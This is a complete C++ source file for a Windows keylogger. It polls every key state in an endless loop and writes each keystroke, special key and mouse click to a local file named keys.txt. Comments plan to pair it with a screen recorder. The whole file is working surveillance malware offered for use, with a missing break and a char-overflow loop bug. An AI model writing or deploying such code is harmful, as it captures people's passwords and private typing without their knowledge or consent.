#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream> 

using namespace std;
void Logging();

int main(){
    Logging();
}

//Get num lock
//Way to organize
void Logging(){
    char c;
    while (true)
    {
        for(c = 0; c <= 254; c++){
            if(GetAsyncKeyState(c) & 0x1)
            {
                ofstream log;
                log.open("keys.txt", ios::app);
                switch (c) {
                    case VK_BACK:
                        log << "[backspace]";//delete characters
                        break;
                    case VK_RETURN:
                        log << "\n";//go to next line
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                        log << "Lclick";
                        break;
                    case VK_RBUTTON:
                        log << "Rclick";
                        break;
                    default:
                        log << c;
                }
                log.close();
            }
        }
    }
}
//tie in with screen recorder
//put data into log
